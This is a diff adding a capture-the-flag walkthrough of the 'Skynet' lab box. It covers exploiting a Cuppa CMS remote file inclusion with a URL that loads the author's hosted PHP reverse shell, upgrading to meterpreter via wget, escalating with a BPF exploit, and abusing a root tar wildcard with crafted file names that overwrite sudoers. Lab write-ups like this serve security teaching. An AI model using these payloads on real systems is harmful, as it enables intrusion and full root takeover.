@@ -138,15 +138,53 @@ There was nothing special or manipulatable on this page. Running gobuster again 
 
 Running searchsploit for cuppa shows one RFI/LFI vulnerability.
 
+I ran the SimpleHTTP python module in a directory that contains my php reverse shell script. When the php script is ran it will call back to my system. 
  
+I exploited the RFI vulnerability to call the php reverse shell script on my system. 
 
+    http://10.10.184.129/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.3.104/php-reverse-shell.php
 
+The SKYNET box requested and executed my php script that then called back to my machine listenting on port 1234.
 
+I am now user www-data and can read the user.txt file in /home/milesdyson. 
 
+## Upgrading shell to meterpreter 
 
+Created the payload called shell.elf uisng msfvenom. 
 
+Used msf exploit/multi/handler to listened for the call back.
 
+I used the python SimpleHTTP to host shell.elf.
 
+Using my current shell with SKYNET I went to a directory that I can write in /var/www/html. I used wget to download shell.elf and gave it executable permissions with chmod.
 
+After running this I had a successful meterpreter shell on SKYNET.
 
+## Privilege escalation
 
+I used the metasploit exploit suggester script and uploaded and ran [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+
+    run post/multi/recon/local_exploit_suggester
+    
+  Out of the 3 suggested local exploits the [BPF sign extension](https://www.rapid7.com/db/modules/exploit/linux/local/bpf_sign_extension_priv_esc) worked and I was able to obtain a root shell. 
+  
+  The linpeas output and manual poking around releaved a backups job that gets run and saved to /home/milesdyson/backsups. The script is owned and ran as root using tar for the backups.  
+
+Reading this awsome article by **int0x33** shows excatly how to abuse the wildcard in "tar * " into using file names as command arguments to be able to either run a reverse shell script or add the current user into the sudoers file.
+ 
+I decided to go the sudoers route. I ran "shell" to drop into a normal shell and ran the following to have a proper tty terminals session. 
+
+    python -c 'import pty;pty.spawn("/bin/bash")';
+ 
+I moved to /var/www/html (which is the directory being tar'd) and ran the following.
+
+    echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+    echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+    echo "/var/www/html"  > --checkpoint=1
+
+After short while I ran "sudo -l" with the following results.
+
+    User www-data may run the following commands on skynet:
+        (root) NOPASSWD: ALL
+
+I am now able to run "sudo cat /root/root.txt" :)
